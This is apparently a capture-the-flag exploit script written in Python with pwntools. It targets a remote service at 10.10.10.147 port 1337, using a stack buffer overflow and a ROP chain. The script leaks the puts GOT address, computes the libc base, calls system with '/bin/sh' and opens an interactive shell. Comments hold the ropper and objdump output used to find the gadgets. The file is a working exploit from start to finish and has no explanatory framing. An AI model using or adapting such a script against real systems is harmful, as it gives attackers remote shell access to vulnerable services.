#!/usr/bin/python3

from pwn import *
p = remote("10.10.10.147" , 1337)
junk = b"A" * 120

# ropper --file myapp --search "pop rdi"
# [INFO] Load gadgets for section: LOAD
# [LOAD] loading... 100%
# [LOAD] removing double gadgets... 100%
# [INFO] Searching for gadgets: pop rdi

# [INFO] File: myapp
# 0x0000000000401090: pop rdi; adc dword ptr [rax], eax; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; 
# 0x000000000040120b: pop rdi; ret; 


pop_rdi = p64(0x40120b)


# objdump -D myapp | grep "system"
# 0000000000401040 <system@plt>:
#   401040:       ff 25 da 2f 00 00       jmp    *0x2fda(%rip)        # 404020 <system@GLIBC_2.2.5>
#   40116e:       e8 cd fe ff ff          call   401040 <system@plt>
system_plt = p64(0x401040)

main = p64(0x40115f)

# objdump -D myapp | grep "puts"
# 0000000000401030 <puts@plt>:
#   401030:       ff 25 e2 2f 00 00       jmp    *0x2fe2(%rip)        # 404018 <puts@GLIBC_2.2.5>
#   4011a1:       e8 8a fe ff ff          call   401030 <puts@plt>


got_puts = p64(0x404018)
payload = junk + pop_rdi + got_puts + system_plt + main
print(p.recvline())
p.sendline(payload)


leaked_puts = u64(p.recvline().strip()[7:-11].ljust(8, b"\x00"))

lib_address = leaked_puts - 0x068f90

bin_sh_address = p64(lib_address + 0x161c19)
payload = junk + pop_rdi + bin_sh_address + system_plt
p.recvline()
p.sendline(payload)
p.interactive()

